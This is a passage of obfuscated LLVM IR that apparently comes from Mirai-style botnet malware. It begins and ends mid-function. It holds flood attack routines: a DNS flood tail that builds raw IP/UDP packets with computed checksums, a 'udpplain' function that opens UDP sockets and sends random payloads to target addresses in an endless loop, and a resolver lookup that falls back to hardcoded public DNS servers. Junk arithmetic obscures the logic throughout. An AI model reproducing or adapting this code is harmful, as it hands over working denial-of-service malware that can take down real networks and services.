  %416 = and i32 %415, %414
  %417 = and i32 %409, 65535
  %418 = trunc i32 %416 to i16
  %419 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %420 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %419, i32 0, i32 0
  store i16 %418, i16* %420, align 2
  br label %421

; <label>:421:                                    ; preds = %408, %404
  %422 = load i8*, i8** %36, align 8
  %423 = load i8, i8* %19, align 1
  %424 = zext i8 %423 to i32
  call void @rand_alpha_str(i8* %422, i32 %424)
  %425 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %426 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %425, i32 0, i32 7
  store i16 0, i16* %426, align 2
  %427 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %428 = bitcast %struct.iphdr* %427 to i16*
  %429 = call zeroext i16 @checksum_generic(i16* %428, i32 20)
  %430 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %431 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %430, i32 0, i32 7
  store i16 %429, i16* %431, align 2
  %432 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %433 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %432, i32 0, i32 3
  store i16 0, i16* %433, align 2
  %434 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %435 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %436 = bitcast %struct.udphdr* %435 to i8*
  %437 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %438 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %437, i32 0, i32 2
  %439 = load i16, i16* %438, align 2
  %440 = load i8, i8* %19, align 1
  %441 = zext i8 %440 to i64
  %442 = sub i64 21, -580848008139907943
  %443 = add i64 %442, %441
  %444 = add i64 %443, -580848008139907943
  %445 = add i64 21, %441
  %446 = sub i64 0, %444
  %447 = sub i64 0, 2
  %448 = add i64 %446, %447
  %449 = sub i64 0, %448
  %450 = add i64 %444, 2
  %451 = load i32, i32* %21, align 4
  %452 = sext i32 %451 to i64
  %453 = sub i64 %449, 1105259569424684261
  %454 = add i64 %453, %452
  %455 = add i64 %454, 1105259569424684261
  %456 = add i64 %449, %452
  %457 = sub i64 0, %455
  %458 = sub i64 0, 4
  %459 = add i64 %457, %458
  %460 = sub i64 0, %459
  %461 = add i64 %455, 4
  %462 = trunc i64 %460 to i32
  %463 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %434, i8* %436, i16 zeroext %439, i32 %462)
  %464 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %465 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %464, i32 0, i32 3
  store i16 %463, i16* %465, align 2
  %466 = load i32, i32* %22, align 4
  %467 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %468 = load i32, i32* %9, align 4
  %469 = sext i32 %468 to i64
  %470 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %467, i64 %469
  %471 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %470, i32 0, i32 0
  %472 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %471, i32 0, i32 2
  %473 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %472, i32 0, i32 0
  store i32 %466, i32* %473, align 4
  %474 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %475 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %474, i32 0, i32 1
  %476 = load i16, i16* %475, align 2
  %477 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %478 = load i32, i32* %9, align 4
  %479 = sext i32 %478 to i64
  %480 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %477, i64 %479
  %481 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %480, i32 0, i32 0
  %482 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %481, i32 0, i32 1
  store i16 %476, i16* %482, align 2
  %483 = load i32, i32* %10, align 4
  %484 = load i8*, i8** %32, align 8
  %485 = load i8, i8* %19, align 1
  %486 = zext i8 %485 to i64
  %487 = add i64 41, 9112978625476167364
  %488 = add i64 %487, %486
  %489 = sub i64 %488, 9112978625476167364
  %490 = add i64 41, %486
  %491 = sub i64 %489, 2500808536162028314
  %492 = add i64 %491, 2
  %493 = add i64 %492, 2500808536162028314
  %494 = add i64 %489, 2
  %495 = load i32, i32* %21, align 4
  %496 = sext i32 %495 to i64
  %497 = sub i64 0, %496
  %498 = sub i64 %493, %497
  %499 = add i64 %493, %496
  %500 = add i64 %498, -5250199915560832680
  %501 = add i64 %500, 4
  %502 = sub i64 %501, -5250199915560832680
  %503 = add i64 %498, 4
  %504 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %505 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %506 = load i32, i32* %9, align 4
  %507 = sext i32 %506 to i64
  %508 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %505, i64 %507
  %509 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %508, i32 0, i32 0
  %510 = bitcast %struct.sockaddr_in* %509 to %struct.sockaddr*
  store %struct.sockaddr* %510, %struct.sockaddr** %504, align 8
  %511 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %512 = load %struct.sockaddr*, %struct.sockaddr** %511, align 8
  %513 = call i64 @sendto(i32 %483, i8* %484, i64 %502, i32 16384, %struct.sockaddr* %512, i32 16)
  br label %514

; <label>:514:                                    ; preds = %421
  %515 = load i32, i32* %9, align 4
  %516 = sub i32 %515, -845325847
  %517 = add i32 %516, 1
  %518 = add i32 %517, -845325847
  %519 = add nsw i32 %515, 1
  store i32 %518, i32* %9, align 4
  br label %331

; <label>:520:                                    ; preds = %331
  br label %330

; <label>:521:                                    ; preds = %92, %86, %80
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 21)
  %11 = call i8* @table_retrieve_val(i32 21, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 21)
  %13 = load i32, i32* %2, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %106

; <label>:15:                                     ; preds = %0
  %16 = load i32, i32* %2, align 4
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %18 = call i64 @read(i32 %16, i8* %17, i64 2048)
  %19 = trunc i64 %18 to i32
  store i32 %19, i32* %3, align 4
  %20 = load i32, i32* %2, align 4
  %21 = call i32 @close(i32 %20)
  call void @table_unlock_val(i8 zeroext 22)
  %22 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %23 = load i32, i32* %3, align 4
  %24 = call i8* @table_retrieve_val(i32 22, i32* null)
  %25 = call i32 @util_stristr(i8* %22, i32 %23, i8* %24)
  store i32 %25, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 22)
  %26 = load i32, i32* %4, align 4
  %27 = icmp ne i32 %26, -1
  br i1 %27, label %28, label %105

; <label>:28:                                     ; preds = %15
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %29 = load i32, i32* %4, align 4
  store i32 %29, i32* %6, align 4
  br label %30

; <label>:30:                                     ; preds = %93, %28
  %31 = load i32, i32* %6, align 4
  %32 = load i32, i32* %3, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %98

; <label>:34:                                     ; preds = %30
  %35 = load i32, i32* %6, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  store i8 %38, i8* %10, align 1
  %39 = load i8, i8* %8, align 1
  %40 = icmp ne i8 %39, 0
  br i1 %40, label %52, label %41

; <label>:41:                                     ; preds = %34
  %42 = load i8, i8* %10, align 1
  %43 = sext i8 %42 to i32
  %44 = icmp eq i32 %43, 32
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 9
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %45, %41
  br label %93

; <label>:50:                                     ; preds = %45
  store i8 1, i8* %8, align 1
  br label %51

; <label>:51:                                     ; preds = %50
  br label %52

; <label>:52:                                     ; preds = %51, %34
  %53 = load i8, i8* %10, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp ne i32 %54, 46
  br i1 %55, label %56, label %64

; <label>:56:                                     ; preds = %52
  %57 = load i8, i8* %10, align 1
  %58 = sext i8 %57 to i32
  %59 = icmp slt i32 %58, 48
  br i1 %59, label %72, label %60

; <label>:60:                                     ; preds = %56
  %61 = load i8, i8* %10, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp sgt i32 %62, 57
  br i1 %63, label %72, label %64

; <label>:64:                                     ; preds = %60, %52
  %65 = load i32, i32* %6, align 4
  %66 = load i32, i32* %3, align 4
  %67 = sub i32 %66, 973880621
  %68 = sub i32 %67, 1
  %69 = add i32 %68, 973880621
  %70 = sub nsw i32 %66, 1
  %71 = icmp eq i32 %65, %69
  br i1 %71, label %72, label %92

; <label>:72:                                     ; preds = %64, %60, %56
  %73 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %74 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %75 = load i32, i32* %4, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8, i8* %74, i64 %76
  %78 = load i32, i32* %6, align 4
  %79 = load i32, i32* %4, align 4
  %80 = sub i32 %78, -2042561054
  %81 = sub i32 %80, %79
  %82 = add i32 %81, -2042561054
  %83 = sub nsw i32 %78, %79
  call void @util_memcpy(i8* %73, i8* %77, i32 %82)
  %84 = load i32, i32* %6, align 4
  %85 = load i32, i32* %4, align 4
  %86 = sub i32 %84, -490974745
  %87 = sub i32 %86, %85
  %88 = add i32 %87, -490974745
  %89 = sub nsw i32 %84, %85
  %90 = sext i32 %88 to i64
  %91 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %90
  store i8 0, i8* %91, align 1
  store i8 1, i8* %9, align 1
  br label %98

; <label>:92:                                     ; preds = %64
  br label %93

; <label>:93:                                     ; preds = %92, %49
  %94 = load i32, i32* %6, align 4
  %95 = sub i32 0, 1
  %96 = sub i32 %94, %95
  %97 = add nsw i32 %94, 1
  store i32 %96, i32* %6, align 4
  br label %30

; <label>:98:                                     ; preds = %72, %30
  %99 = load i8, i8* %9, align 1
  %100 = icmp ne i8 %99, 0
  br i1 %100, label %101, label %104

; <label>:101:                                    ; preds = %98
  %102 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %103 = call i32 @inet_addr(i8* %102) #6
  store i32 %103, i32* %1, align 4
  br label %117

; <label>:104:                                    ; preds = %98
  br label %105

; <label>:105:                                    ; preds = %104, %15
  br label %106

; <label>:106:                                    ; preds = %105, %0
  %107 = call i32 @rand_next()
  %108 = urem i32 %107, 4
  switch i32 %108, label %117 [
    i32 0, label %109
    i32 1, label %111
    i32 2, label %113
    i32 3, label %115
  ]

; <label>:109:                                    ; preds = %106
  %110 = call i32 @htonl(i32 134744072) #7
  store i32 %110, i32* %1, align 4
  br label %117

; <label>:111:                                    ; preds = %106
  %112 = call i32 @htonl(i32 1246898730) #7
  store i32 %112, i32* %1, align 4
  br label %117

; <label>:113:                                    ; preds = %106
  %114 = call i32 @htonl(i32 1074151430) #7
  store i32 %114, i32* %1, align 4
  br label %117

; <label>:115:                                    ; preds = %106
  %116 = call i32 @htonl(i32 67240450) #7
  store i32 %116, i32* %1, align 4
  br label %117

; <label>:117:                                    ; preds = %115, %113, %111, %109, %106, %101
  %118 = load i32, i32* %1, align 4
  ret i32 %118
}

declare i32 @util_strlen(i8*) #3

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 512)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #7
  store i16 %56, i16* %13, align 2
  br label %57

; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %174, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %180

; <label>:63:                                     ; preds = %58
  %64 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

; <label>:72:                                     ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

; <label>:81:                                     ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 zeroext %82) #7
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

; <label>:90:                                     ; preds = %81, %72
  %91 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %90
  ret void

; <label>:98:                                     ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 %108, %struct.sockaddr* %112, i32 16) #6
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

; <label>:115:                                    ; preds = %98
  br label %116

; <label>:116:                                    ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %155

; <label>:125:                                    ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 %131) #7
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = sub i32 0, %132
  %143 = sub i32 0, %141
  %144 = add i32 %142, %143
  %145 = sub i32 0, %144
  %146 = add i32 %132, %141
  %147 = call i32 @htonl(i32 %145) #7
  %148 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %149 = load i32, i32* %9, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %148, i64 %150
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %151, i32 0, i32 0
  %153 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %152, i32 0, i32 2
  %154 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %153, i32 0, i32 0
  store i32 %147, i32* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %125, %116
  %156 = load i32*, i32** %11, align 8
  %157 = load i32, i32* %9, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds i32, i32* %156, i64 %158
  %160 = load i32, i32* %159, align 4
  %161 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %162 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %163 = load i32, i32* %9, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i32 0, i32 0
  %167 = bitcast %struct.sockaddr_in* %166 to %struct.sockaddr*
  store %struct.sockaddr* %167, %struct.sockaddr** %161, align 8
  %168 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %169 = load %struct.sockaddr*, %struct.sockaddr** %168, align 8
  %170 = call i32 @connect(i32 %160, %struct.sockaddr* %169, i32 16)
  %171 = icmp eq i32 %170, -1
  br i1 %171, label %172, label %173

; <label>:172:                                    ; preds = %155
  br label %173

; <label>:173:                                    ; preds = %172, %155
  br label %174

; <label>:174:                                    ; preds = %173
  %175 = load i32, i32* %9, align 4
  %176 = add i32 %175, 2056780815
  %177 = add i32 %176, 1
  %178 = sub i32 %177, 2056780815
  %179 = add nsw i32 %175, 1
  store i32 %178, i32* %9, align 4
  br label %58

; <label>:180:                                    ; preds = %58
  br label %181

; <label>:181:                                    ; preds = %216, %180
  store i32 0, i32* %9, align 4
  br label %182

; <label>:182:                                    ; preds = %209, %181
  %183 = load i32, i32* %9, align 4
  %184 = load i8, i8* %5, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp slt i32 %183, %185
  br i1 %186, label %187, label %216

; <label>:187:                                    ; preds = %182
  %188 = load i8**, i8*** %10, align 8
  %189 = load i32, i32* %9, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds i8*, i8** %188, i64 %190
  %192 = load i8*, i8** %191, align 8
  store i8* %192, i8** %22, align 8
  %193 = load i8, i8* %15, align 1
  %194 = icmp ne i8 %193, 0
  br i1 %194, label %195, label %199

; <label>:195:                                    ; preds = %187
  %196 = load i8*, i8** %22, align 8
  %197 = load i16, i16* %14, align 2
  %198 = zext i16 %197 to i32
  call void @rand_str(i8* %196, i32 %198)
  br label %199

; <label>:199:                                    ; preds = %195, %187
  %200 = load i32*, i32** %11, align 8
  %201 = load i32, i32* %9, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds i32, i32* %200, i64 %202
  %204 = load i32, i32* %203, align 4
  %205 = load i8*, i8** %22, align 8
  %206 = load i16, i16* %14, align 2
  %207 = zext i16 %206 to i64
  %208 = call i64 @send(i32 %204, i8* %205, i64 %207, i32 16384)
  br label %209

; <label>:209:                                    ; preds = %199
  %210 = load i32, i32* %9, align 4
  %211 = sub i32 0, %210
  %212 = sub i32 0, 1
  %213 = add i32 %211, %212
  %214 = sub i32 0, %213
  %215 = add nsw i32 %210, 1
  store i32 %214, i32* %9, align 4
  br label %182

; <label>:216:                                    ; preds = %182
  br label %181
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %18, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %24

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 0, %13
  %16 = sub i64 %14, %15
  %17 = add i64 %14, %13
  store i64 %16, i64* %5, align 8
  br label %18

; <label>:18:                                     ; preds = %9
  %19 = load i32, i32* %4, align 4
  %20 = sub i32 %19, 1960355431
  %21 = sub i32 %20, 2
  %22 = add i32 %21, 1960355431
  %23 = sub i32 %19, 2
  store i32 %22, i32* %4, align 4
  br label %6

; <label>:24:                                     ; preds = %6
  %25 = load i32, i32* %4, align 4
  %26 = icmp eq i32 %25, 1
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %24
  %28 = load i16*, i16** %3, align 8
  %29 = load i16, i16* %28, align 2
  %30 = trunc i16 %29 to i8
  %31 = sext i8 %30 to i64
  %32 = load i64, i64* %5, align 8
  %33 = sub i64 0, %31
  %34 = sub i64 %32, %33
  %35 = add i64 %32, %31
  store i64 %34, i64* %5, align 8
  br label %36

; <label>:36:                                     ; preds = %27, %24
  %37 = load i64, i64* %5, align 8
  %38 = lshr i64 %37, 16
  %39 = load i64, i64* %5, align 8
  %40 = xor i64 %39, -1
  %41 = xor i64 65535, -1
  %42 = xor i64 4275022865643826945, -1
  %43 = or i64 %40, %41
  %44 = or i64 4275022865643826945, %42
  %45 = xor i64 %43, -1
  %46 = and i64 %45, %44
  %47 = and i64 %39, 65535
  %48 = sub i64 0, %38
  %49 = sub i64 0, %46
  %50 = add i64 %48, %49
  %51 = sub i64 0, %50
  %52 = add i64 %38, %46
  store i64 %51, i64* %5, align 8
  %53 = load i64, i64* %5, align 8
  %54 = lshr i64 %53, 16
  %55 = load i64, i64* %5, align 8
  %56 = sub i64 %55, -8654857083389517652
  %57 = add i64 %56, %54
  %58 = add i64 %57, -8654857083389517652
  %59 = add i64 %55, %54
  store i64 %58, i64* %5, align 8
  %60 = load i64, i64* %5, align 8
  %61 = xor i64 %60, -1
  %62 = and i64 -2110005300143213531, %61
  %63 = xor i64 -2110005300143213531, -1
  %64 = and i64 %60, %63
  %65 = xor i64 -1, -1
  %66 = and i64 %65, -2110005300143213531
  %67 = and i64 -1, %63
  %68 = or i64 %62, %64
  %69 = or i64 %66, %67
  %70 = xor i64 %68, %69
  %71 = xor i64 %60, -1
  %72 = trunc i64 %70 to i16
  ret i16 %72
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %43

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = sub i32 0, %30
  %32 = sub i32 0, %29
  %33 = add i32 %31, %32
  %34 = sub i32 0, %33
  %35 = add i32 %30, %29
  store i32 %34, i32* %12, align 4
  %36 = load i16*, i16** %9, align 8
  %37 = getelementptr inbounds i16, i16* %36, i32 1
  store i16* %37, i16** %9, align 8
  %38 = load i32, i32* %8, align 4
  %39 = sub i32 %38, 58930751
  %40 = sub i32 %39, 2
  %41 = add i32 %40, 58930751
